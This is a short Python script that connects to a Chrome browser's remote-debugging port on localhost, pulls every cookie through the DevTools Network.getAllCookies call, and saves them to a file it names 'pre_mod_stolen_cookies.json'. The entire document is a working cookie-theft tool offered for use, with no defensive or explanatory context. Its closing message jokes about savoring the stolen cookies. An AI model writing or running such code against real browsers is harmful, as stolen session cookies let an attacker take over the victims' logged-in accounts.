import os
import subprocess
import requests
import json

DEBUG_PORT=#CHANGE ME

def get_cookies():

	r = requests.get(f"http://127.0.0.1:{DEBUG_PORT}/json")
	dicts = r.json()

	debuggerurls = []
	for dict in dicts:
		url = dict["webSocketDebuggerUrl"]
		debuggerurls.append(url)
	
	du = debuggerurls[-1]
	c = subprocess.check_output("wscat --connect "+ du +" -x '{\"id\":1, \"method\":\"Network.getAllCookies\"}'", shell=True)
	response = json.loads(c)
	cookies = response['result']['cookies']
	
	return cookies


cookies = get_cookies()
json_cookies = json.dumps(cookies, indent=4)
with open("pre_mod_stolen_cookies.json","w+") as f:
	f.write(json_cookies)

os.system("sed -E \'s/\"\./\"/\' pre_mod_stolen_cookies.json > cookies.json")
print("Done! Find your cookies in cookies.json and savor their flavor!")
